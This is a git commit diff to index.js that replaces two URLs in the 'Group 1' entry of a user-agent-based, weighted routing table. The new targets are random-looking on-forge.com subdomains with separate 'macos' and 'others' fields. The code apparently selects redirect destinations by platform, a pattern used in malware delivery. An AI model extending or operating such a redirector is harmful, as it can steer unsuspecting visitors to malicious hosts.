00a21c1a04f7b65614efb7682402a50e7f948b54
animalinside <akshay.anand12@yahoo.com>
2026-05-10 11:33:57 +0530

    Update URLs for Group 1 in index.js

--- index.js
+++ index.js
@@ -46,8 +46,8 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://secujkhgfhg.on-forge.com/",
-            others: "https://secujkhgfhg.on-forge.com/"
+            macos: "https://lksusavdysvdsvs.on-forge.com/",
+            others: "https://lksusavdysvdsvs.on-forge.com/"
         },
         {
             id: "Group 2",
